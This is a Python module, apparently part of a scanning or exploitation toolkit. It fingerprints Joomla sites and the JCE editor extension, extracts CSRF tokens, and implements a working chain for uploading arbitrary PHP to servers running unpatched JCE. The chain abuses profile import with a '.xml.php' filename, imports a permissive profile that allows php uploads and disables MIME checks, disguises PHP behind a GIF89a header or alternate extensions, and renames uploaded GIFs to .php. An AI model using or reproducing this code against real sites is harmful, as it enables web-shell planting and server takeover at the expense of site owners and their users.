#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generic Joomla / JCE fingerprinting and JCE file-upload primitives."""

from __future__ import annotations

import json
import random
import re
import string
import time
from typing import Any, Dict, List, Optional, Tuple

from lib.scanner.http.detectors import detect_joomla

JCE_PATCHED_VERSION = "2.9.99.5"

_JOOMLA_VERSION_RE = re.compile(
    r'<meta\s+name=["\']generator["\'][^>]+content=["\']Joomla!\s+([0-9.]+)',
    re.IGNORECASE,
)
_XML_VERSION_RE = re.compile(r"<version>([^<]+)</version>", re.IGNORECASE)
_CSRF_PATTERNS = (
    r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
    r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
    r'name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"',
    r'name="token"\s+content="([a-f0-9]{32})"',
    r'data-joomla-token="([a-f0-9]{32})"',
)


class JoomlaProbe:
    """Joomla / JCE helpers bound to an ``Http_client`` module instance."""

    def __init__(self, client: Any):
        self.client = client

    @staticmethod
    def parse_version_parts(version: str) -> List[int]:
        parts: List[int] = []
        for token in str(version or "").strip().split("."):
            digits = "".join(ch for ch in token if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        return parts

    @classmethod
    def version_less_than(cls, v1: str, v2: str) -> bool:
        if not v1 or not v2:
            return False
        a = cls.parse_version_parts(v1)
        b = cls.parse_version_parts(v2)
        for i in range(max(len(a), len(b))):
            av = a[i] if i < len(a) else 0
            bv = b[i] if i < len(b) else 0
            if av < bv:
                return True
            if av > bv:
                return False
        return False

    @classmethod
    def jce_is_patched(cls, version: str, patched: str = JCE_PATCHED_VERSION) -> bool:
        if not version:
            return False
        return not cls.version_less_than(version, patched)

    @staticmethod
    def extract_csrf_token(body: str) -> Optional[str]:
        if not body:
            return None
        for pattern in _CSRF_PATTERNS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return match.group(1)
        match = re.search(
            r'<input\s+type="hidden"\s+name="([a-f0-9]{32})"\s+value="1"',
            body,
            re.IGNORECASE,
        )
        if match:
            return match.group(1)
        match = re.search(
            r'<input\s+name="([a-f0-9]{32})"\s+type="hidden"\s+value="1"',
            body,
            re.IGNORECASE,
        )
        return match.group(1) if match else None

    @staticmethod
    def random_stem(prefix: str = "ks", length: int = 6) -> str:
        alphabet = string.ascii_lowercase + string.digits
        return f"{prefix}{''.join(random.choices(alphabet, k=length))}"

    @staticmethod
    def gif_wrap(php: str) -> bytes:
        return b"GIF89a\n" + php.encode("utf-8")

    def http_get(self, path: str, timeout: Optional[float] = None):
        kwargs: Dict[str, Any] = {"allow_redirects": True}
        if timeout is not None:
            kwargs["timeout"] = timeout
        return self.client.http_request(method="GET", path=path, **kwargs)

    def probe_joomla(self) -> Dict[str, Any]:
        result: Dict[str, Any] = {"found": False, "version": None}
        response = self.http_get("/")
        if not response:
            return result

        body = response.text or ""
        if detect_joomla(response):
            result["found"] = True

        match = _JOOMLA_VERSION_RE.search(body)
        if match:
            return {"found": True, "version": match.group(1).strip()}

        low = body.lower()
        signs = (
            "/templates/",
            "/media/jui/",
            "/media/system/",
            "/components/com_",
            "/modules/mod_",
            "option=com_",
            "data-joomla-version",
            "joomla-script-options",
        )
        if sum(1 for sign in signs if sign.lower() in low) >= 2:
            result["found"] = True

        for asset in ("/media/system/js/core.js", "/templates/system/css/system.css"):
            asset_resp = self.http_get(asset, timeout=6)
            if asset_resp and asset_resp.status_code == 200 and len(asset_resp.text or "") > 20:
                result["found"] = True
                break

        admin = self.http_get("/administrator/index.php", timeout=6)
        if admin and admin.status_code == 200:
            admin_body = admin.text or ""
            if any(
                marker in admin_body.lower()
                for marker in ("joomla", "form-login", "joomla-administrator", "jform")
            ):
                result["found"] = True
                ver = re.search(r"joomla!?\s*v?([0-9.]+)", admin_body, re.IGNORECASE)
                if ver:
                    return {"found": True, "version": ver.group(1).strip()}

        for manifest in (
            "/administrator/manifests/files/joomla.xml",
            "/administrator/manifest.xml",
            "/language/en-GB/en-GB.xml",
        ):
            manifest_resp = self.http_get(manifest, timeout=6)
            if not manifest_resp or manifest_resp.status_code != 200:
                continue
            ver = _XML_VERSION_RE.search(manifest_resp.text or "")
            if ver:
                return {"found": True, "version": ver.group(1).strip()}
            result["found"] = True

        return result

    def probe_jce(self) -> Dict[str, Any]:
        for manifest in (
            "/plugins/editors/jce/jce.xml",
            "/administrator/components/com_jce/jce.xml",
        ):
            response = self.http_get(manifest, timeout=6)
            if not response or response.status_code != 200:
                continue
            body = response.text or ""
            if len(body) <= 20:
                continue
            match = _XML_VERSION_RE.search(body)
            if match:
                return {"found": True, "version": match.group(1).strip()}
            return {"found": True, "version": None}

        for asset in (
            "/plugins/system/jcemediabox/js/jcemediabox.js",
            "/media/editors/jce/js/editor.min.js",
        ):
            response = self.http_get(asset, timeout=6)
            if response and response.status_code == 200 and len(response.text or "") > 20:
                return {"found": True, "version": None}

        explorer = self.http_get("/index.php?option=com_jce&task=explorer", timeout=6)
        if explorer and explorer.status_code == 200 and "jce" in (explorer.text or "").lower():
            return {"found": True, "version": None}

        return {"found": False, "version": None}

    def fetch_csrf_token(self) -> Optional[str]:
        response = self.http_get("/")
        if not response or response.status_code != 200:
            return None
        return self.extract_csrf_token(response.text or "")

    def jce_has_feed(self) -> bool:
        response = self.http_get("/index.php?option=com_jce&task=cpanel.feed", timeout=6)
        return bool(response and response.status_code == 200 and '"feeds"' in (response.text or ""))

    def jce_profile_import(self, token: str, filename: str, body: str) -> bool:
        response = self.client.http_request(
            method="POST",
            path="/index.php?option=com_jce",
            data={"task": "profiles.import", token: "1"},
            files={"profile_file": (filename, body.encode("utf-8"), "application/xml")},
            timeout=12,
        )
        return bool(response and response.status_code == 200)

    def jce_import_permissive_browser_profile(self, token: str) -> bool:
        profile_name = self.random_stem("KS")
        params = json.dumps(
            {
                "browser": {
                    "filetypes": "images=jpg,jpeg,png,gif;files=php,txt,gif",
                    "upload": {
                        "max_size": "102400",
                        "validate_mimetype": "0",
                        "add_random": "0",
                    },
                    "features": {
                        "upload": 1,
                        "folder": {"rename": 1},
                        "file": {"rename": 1},
                    },
                }
            }
        )
        xml = (
            '<?xml version="1.0"?><jce><profiles><profile>'
            f"<name>{profile_name}</name><published>1</published>"
            "<ordering>-99999</ordering><area>0</area>"
            "<device>desktop,tablet,phone</device>"
            "<components></components><users></users>"
            "<types>1,8</types><rows><![CDATA[[]]]></rows>"
            "<plugins>browser,image,media,link,file</plugins>"
            f"<params><![CDATA[{params}]]></params>"
            "</profile></profiles></jce>"
        )
        response = self.client.http_request(
            method="POST",
            path="/index.php?option=com_jce",
            data={"task": "profiles.import", token: "1"},
            files={"profile_file": ("profile.xml", xml.encode("utf-8"), "application/xml")},
            timeout=12,
        )
        if not response or response.status_code != 200:
            return False
        try:
            payload = json.loads(response.text or "")
        except Exception:
            return False
        for bucket in ("message", "error"):
            for message in payload.get("messages", {}).get(bucket, []):
                if "imported successfully" in str(message).lower():
                    return True
        return False

    def jce_browser_upload(
        self,
        token: str,
        filename: str,
        data: bytes,
        content_type: str,
    ) -> bool:
        response = self.client.http_request(
            method="POST",
            path=f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
            data={
                "method": "upload",
                "upload-dir": "",
                "name": filename,
                token: "1",
            },
            files={"file": (filename, data, content_type)},
            timeout=12,
        )
        return bool(response and response.status_code == 200)

    def jce_browser_rename(self, token: str, stem: str, from_ext: str) -> Optional[str]:
        rpc = json.dumps(
            {
                "id": "rn",
                "method": "renameItem",
                "params": [f"{stem}.{from_ext}", f"{stem}.php"],
            }
        )
        response = self.client.http_request(
            method="POST",
            path=f"/index.php?option=com_jce&task=plugin.rpc&plugin=browser&{token}=1",
            data={token: "1", "json": rpc},
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=12,
        )
        if not response:
            return None
        time.sleep(0.3)
        for ext in ("php", f"php.{from_ext}"):
            check = self.http_get(f"/images/{stem}.{ext}", timeout=6)
            if check and check.status_code == 200:
                return ext
        return None

    def jce_upload_php(
        self,
        token: str,
        php_source: str,
        stem: Optional[str] = None,
    ) -> Optional[Dict[str, str]]:
        """
        Upload arbitrary PHP via JCE profile import or browser chain.

        Returns ``{path, filename, vector}`` when a reachable path is found.
        """
        stem = stem or self.random_stem()
        filename = f"{stem}.xml.php"

        if self.jce_profile_import(token, filename, php_source):
            time.sleep(0.3)
            for path in (f"/tmp/{filename}", f"/{filename}"):
                check = self.http_get(path, timeout=8)
                if check and check.status_code == 200:
                    return {"path": path, "filename": filename, "vector": "profile_import"}

        if not self.jce_has_feed():
            return None
        if not self.jce_import_permissive_browser_profile(token):
            return None
        time.sleep(0.3)

        variants: Tuple[Tuple[str, bytes, str], ...] = (
            (f"{stem}.php", php_source.encode("utf-8"), "text/plain"),
            (f"{stem}.php", self.gif_wrap(php_source), "image/gif"),
            (f"{stem}.phtml", php_source.encode("utf-8"), "text/plain"),
            (f"{stem}.php5", php_source.encode("utf-8"), "text/plain"),
        )
        for upload_name, data, content_type in variants:
            if not self.jce_browser_upload(token, upload_name, data, content_type):
                continue
            time.sleep(0.3)
            ext = upload_name.rsplit(".", 1)[-1]
            path = f"/images/{stem}.{ext}"
            check = self.http_get(path, timeout=6)
            if check and check.status_code == 200:
                return {"path": path, "filename": f"{stem}.{ext}", "vector": "browser_upload"}

        gif_name = f"{stem}.gif"
        if self.jce_browser_upload(token, gif_name, self.gif_wrap(php_source), "image/gif"):
            time.sleep(0.3)
            renamed = self.jce_browser_rename(token, stem, "gif")
            if renamed:
                return {
                    "path": f"/images/{stem}.{renamed}",
                    "filename": f"{stem}.{renamed}",
                    "vector": "browser_rename",
                }

        return None
